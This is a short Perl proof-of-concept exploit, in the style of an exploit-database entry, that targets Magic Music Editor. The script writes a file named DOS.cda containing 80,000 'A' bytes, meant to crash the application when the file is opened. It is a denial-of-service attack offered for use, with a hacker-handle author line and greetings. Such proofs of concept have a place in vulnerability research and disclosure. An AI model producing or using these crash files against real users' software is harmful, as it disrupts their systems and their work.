#!/usr/bin/perl
# Exploit Title: Magic Music Editor .cda DOS
# Version      : All Version
# Author       : AtT4CKxT3rR0r1ST  [F.Hack@w.cn]
# Download     : http://www.magic-video-software.com/magic_music_editor/download.html
# Sp3C!4L Gr34T$ T0 h1ch4m 
##############################################################
my $file= "DOS.cda"; 
my $junk = "\x41" x 80000; 
open($FILE,">$file"); 
print $FILE $junk; 
close($FILE); 
print "Files Created successfully\n"; 
sleep(1);